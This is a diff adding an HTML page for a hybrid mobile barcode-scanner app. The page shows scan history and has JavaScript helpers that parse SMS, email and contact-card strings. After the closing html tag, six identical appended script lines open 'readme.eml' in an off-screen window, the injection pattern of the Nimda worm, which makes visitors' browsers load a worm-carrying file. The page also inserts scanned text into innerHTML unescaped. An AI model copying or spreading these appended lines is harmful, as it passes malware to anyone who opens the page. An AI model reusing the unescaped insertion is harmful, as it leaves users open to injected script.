@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html class="um landscape min-width-240px min-width-320px min-width-480px min-width-768px min-width-1024px">
+<head>
+<title></title>
+<meta charset="utf-8">
+<meta name="viewport" content="target-densitydpi=device-dpi, width=device-width, initial-scale=1, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
+<link rel="stylesheet" href="css/ui-img.css">
+<link rel="stylesheet" href="css/ui-list.css">
+<link rel="stylesheet" href="css/ui-tab.css">
+<link rel="stylesheet" href="css/ui-btn.css">
+<link rel="stylesheet" href="css/ui-base.css">
+<link rel="stylesheet" href="css/ui-box.css">
+<link rel="stylesheet" href="css/ui-color.css">
+<link rel="stylesheet" href="css/ui-res.css">
+<script src="js/zy_control.js"></script>
+<script src="js/zy_click.js"></script>
+<script src="js/zy_json.js"></script>
+<script>
+	function openNewWin(wname,html,aid){
+		uexWindow.open(wname, '0', html, aid, '', '', 0x0);
+	}
+</script>
+</head>
+<body class="um-vp c-m15" ontouchstart>
+	<div class="ub ub-ver">
+		<!--列表开始-->
+		<div id="showInfo" class="uba  b-gra c-wh">  
+			<div ontouchstart="zy_touch('btn-act')" class="uc-t ubb c-m2 ub b-gra t-bla ub-ac lis" onClick="openNewWin('index_history_text','scanner/index_history_text.html','2')">
+				<div class="lis-icon ub-img im3"></div>
+				<div class="ub-f1 ut-s">9787111336242</div>
+				<div class="tx-r t-blu ulev-1">09:45<br />2012-07-19</div>
+			</div>
+			<div ontouchstart="zy_touch('btn-act')" class=" ub ubb b-gra c-m2 t-bla ub-ac lis" onClick="openNewWin('index_history_text','scanner/index_history_text.html','2')">
+				<div class="lis-icon ub-img im3"></div>
+				<div class="ub-f1 ut-s">9787111336242</div>
+				<div class="tx-r t-blu ulev-1">09:45<br />2012-07-19</div>
+			</div>
+			<div ontouchstart="zy_touch('btn-act')" class=" ub ubb b-gra c-m2 t-bla ub-ac lis" onClick="openNewWin('index_history_text','scanner/index_history_text.html','2')">
+				<div class="lis-icon ub-img im3"></div>
+				<div class="ub-f1 ut-s">9787111336242</div>
+				<div class="tx-r t-blu ulev-1">09:45<br />2012-07-19</div>
+			</div>
+			<div ontouchstart="zy_touch('btn-act')" class=" ub ubb b-gra c-m2 t-bla ub-ac lis" onClick="openNewWin('index_history_text','scanner/index_history_text.html','2')">
+				<div class="lis-icon ub-img im3"></div>
+				<div class="ub-f1 ut-s">9787111336242</div>
+				<div class="tx-r t-blu ulev-1">09:45<br />2012-07-19</div>
+			</div>
+			<div ontouchstart="zy_touch('btn-act')"  class="uc-b c-m2 ub  t-bla ub-ac lis" onClick="openNewWin('index_history_text','scanner/index_history_text.html','2')">
+				<div class="lis-icon ub-img  im3"></div>
+				<div class="ub-f1 ut-s">9787111336242</div>
+				<div class="tx-r t-blu ulev-1">09:45<br />2012-07-19</div>
+			</div>
+		</div>
+		
+		<div id="delete" class="uba  b-gra c-wh" style="display: none;">  
+			<div ontouchstart="zy_touch('btn-act')" class="uc-t ubb c-m2 ub b-gra t-bla ub-ac lis">
+				<div class="lis-icon ub-img im3"></div>
+				<div class="ub-f1 ut-s">9787111336242</div>
+				<div class="res12 lis-sw1 ub-img"></div>
+			</div>
+			<div ontouchstart="zy_touch('btn-act')" class=" ub ubb b-gra c-m2 t-bla ub-ac lis">
+				<div class="lis-icon ub-img im3"></div>
+				<div class="ub-f1 ut-s">9787111336242</div>
+				<div class="res12 lis-sw1 ub-img"></div>
+			</div>
+			<div ontouchstart="zy_touch('btn-act')" class=" ub ubb b-gra c-m2 t-bla ub-ac lis">
+				<div class="lis-icon ub-img im3"></div>
+				<div class="ub-f1 ut-s">9787111336242</div>
+				<div class="res12 lis-sw1 ub-img"></div>
+			</div>
+			<div ontouchstart="zy_touch('btn-act')" class=" ub ubb b-gra c-m2 t-bla ub-ac lis">
+				<div class="lis-icon ub-img im3"></div>
+				<div class="ub-f1 ut-s">9787111336242</div>
+				<div class="res12 lis-sw1 ub-img"></div>
+			</div>
+			<div ontouchstart="zy_touch('btn-act')"  class="uc-b c-m2 ub  t-bla ub-ac lis">
+				<div class="lis-icon ub-img  im3"></div>
+				<div class="ub-f1 ut-s">9787111336242</div>
+				<div class="res12 lis-sw1 ub-img"></div>
+			</div>
+		</div>
+		
+		<div id="no_list" class="uba  b-gra c-wh">  
+			<div ontouchstart="zy_touch('btn-act')" class="uc-t ubb ub b-gra c-m2 t-bla ub-ac umh4 lis">
+				<div class="ub-f1 ut-s">还没有扫描记录哦~~</div>
+			</div>
+		</div>
+		<!--列表结束-->
+	</div>
+</body>
+<script>
+zy_init();
+	//var enurl = localStorage.enurl;
+	var fileText = "";
+	window.uexOnload = function(){
+		var saveText = '[{"text":"http://www.baidu.com/","dateNyr":"2012-08-01","dateSf":"11:30"},{"text":"http://www.sina.com/","dateNyr":"2012-08-01","dateSf":"12:30"}]';
+		if(saveText == "" || !saveText){
+			$$("no_list").style.display = "block";
+			$$("showInfo").style.display = "none";
+		}else{
+			$$("no_list").style.display = "none";
+			$$("showInfo").style.display = "block";
+		}
+		
+		var hisArray = JSON.parse(saveText);
+		var str = "";
+		for(var i = 0; i < hisArray.length;i++){
+			var jsonObj = hisArray[i];
+			//var html_ = "index_history_text.html?index_=" + i;
+			str += '<div ontouchstart="zy_touch("btn-act")" class="uc-t ubb c-m2 ub b-gra t-bla ub-ac lis" onclick="openNewWin("index_history_text","scanner/index_history_text.html","2")">'+
+	              '<div class="lis-icon ub-img im3"></div>'+
+				  '<div class="ub-f1 ut-s">'+jsonObj.text+'</div>'+
+				  '<div class="tx-r t-blu ulev-1">'+jsonObj.dateSf+'<br />'+jsonObj.dateNyr+'</div>'+
+			      '</div>';	
+		}				
+ 		document.getElementById("showInfo").innerHTML = str;
+		uexWindow.onStateChange = function(state){
+			if(state == 0){		
+				document.getElementById("radio_f1c").checked = "checked";
+			}
+		}
+	}
+	
+
+	function readFile(){
+		uexFileMgr.openFile(1,"wgt://data/name.txt",1);
+		uexFileMgr.readFile(1,-1);
+		uexFileMgr.closeFile(1);
+	}
+	function openNewWin(nname,url){
+		uexWindow.open(nname, '0', url, '2', '', '', 0x0);
+	}
+	function subSMS(url_){
+		var sms_arr = new Array();
+		var telindex = url_.indexOf("SM:");
+	 	var str1 = url_.substr(telindex+3,url_.length);
+	 	var yin = str1.indexOf(";");
+	 	var tel = str1.substr(0,yin);
+	 	sms_arr[0] = tel;
+	 	var tin = str1.indexOf("TXT:");
+	 	var str2 = str1.substr(tin+4,str1.length);
+	 	var fin = str2.indexOf(";");
+	 	var text = str2.substr(0,fin);
+	 	sms_arr[1] = text;
+	 	return sms_arr; 
+	}
+	function subEmail(url_){
+		var emailArr = new Array();
+	 	var mailindex = url_.indexOf("MAIL:TO:");
+	  	var str1 = url_.substr(mailindex+8,url_.length);
+	  	var fen1 = str1.indexOf(";");
+	  	var mail = str1.substr(0,fen1);
+	  	emailArr[0] = mail;
+	 	
+	  	var titindex = str1.indexOf("SUB:");
+	  	var str2 = str1.substr(titindex+4,str1.length);
+	  	var fen2 = str2.indexOf(";");
+	  	var tit = str2.substr(0,fen2);
+	  	emailArr[1] = tit;
+	  	return emailArr;
+	}
+	var vin = "";
+	var min = "";
+	function subMing(url_){
+		vin = url_.indexOf("VCARDN:");
+		min = url_.indexOf("MECARD:N:");
+		if(url_ && url_ != "undefined"){
+			if(vin >= 0){
+				var n = vcard_str(url_);
+				return n;
+			}else if(min >= 0){
+				return mecard_str(url_);
+			}else if(url_.indexOf("CARD:N:")){
+				return card_str(url_);
+			}else{
+				return "未命名";
+			}
+		}
+	}
+	function vcard_str(url_){
+		var str1 = url_.substr(vin+7,url_.length);
+		var sname = str1.substr(0,str1.indexOf(";"));
+		var str2 = str1.substr(sname.length+1,str1.length);
+		var t1 = str2.indexOf("TEL:");
+		var t2 = str2.indexOf("TEL;CELL:");
+		if(t1 >= 0 && t2 < 0){
+			var fname = str2.substr(0,str2.indexOf(";"));
+			var name = fname + sname;
+			return name;
+		}
+		if(t2 >= 0){
+			var inf = str2.indexOf("TEL;CELL:");
+			var ins = str2.indexOf("TEL;HOME:");
+			var fname = str2.substr(0,inf);
+			var name = fname + sname;
+			return name;
+		}
+	}
+	function mecard_str(url_){
+		var n = url_.substr(min+9,url_.indexOf(";")-min-9);
+		var ar = n.split(",");
+		var name = ar[1]+ar[0];
+		return name;
+	}
+	function card_str(url_){
+		var str1 = url_.substr(url_.indexOf("CARD:N:")+7,url_.length);
+		var name = str1.substr(0,str1.indexOf(";"));
+		return name;
+	}
+</script>
+</html>
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
